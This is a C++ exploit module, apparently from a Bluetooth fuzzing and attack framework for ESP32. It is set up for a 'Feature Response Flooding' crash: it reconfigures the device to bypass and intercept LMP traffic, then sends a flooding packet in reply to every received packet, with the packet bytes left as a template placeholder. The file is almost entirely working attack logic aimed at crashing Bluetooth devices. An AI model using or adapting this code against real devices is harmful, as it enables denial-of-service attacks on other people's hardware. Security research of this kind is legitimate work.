#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>

// Filters

// Vars

// Setup
const char *module_name()
{
    return "Feature Resp. Flooding";
}

int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->options.auto_start_program = true;
    ctx->config->bluetooth.disable_role_switch = false;
    ctx->config->bluetooth.bridge_hci = true;
    ctx->config->bluetooth.intercept_tx = true;
    ctx->config->bluetooth.lmp_sniffing = true;
    ctx->config->bluetooth.rx_bypass = true; // Bypass ESP32 LMP stack, forward TX/RX to host
    ctx->config->bluetooth.rx_bypass_on_demand = false;
    ctx->config->fuzzing.packet_retry = false;
    ctx->config->fuzzing.enable_duplication = false;
    ctx->config->fuzzing.enable_mutation = false;

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    return 0;
}

// Feature Response Flooding Crash
static uint8_t packet[] = $flooding_pkt;

// RX
int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{

    m_send_packet(ctx, packet, sizeof(packet), 1);
    wd_log_y("Sending flooding packet now!");
    return 0;
}

int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    return 0;
}
